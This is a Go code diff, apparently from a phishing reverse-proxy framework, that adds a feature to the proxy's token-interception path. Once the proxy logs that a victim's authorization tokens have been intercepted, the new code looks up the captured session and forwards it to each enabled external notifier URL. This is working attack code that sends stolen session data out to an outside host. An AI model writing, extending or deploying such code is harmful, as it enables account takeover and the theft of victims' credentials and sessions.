@@ -867,6 +867,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+
+								for _, n := range p.cfg.notifiers {
+									if n.OnEvent == "authenticated" && n.Enabled {
+										session, _ := p.db.GetSessionBySid(ps.SessionId)
+										log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+										err := NotifyOnAuth(n, *session, pl)
+										if err != nil {
+											log.Error("notifier: %v", err)
+										}
+									}
+								}
 							}
 							break
 						}
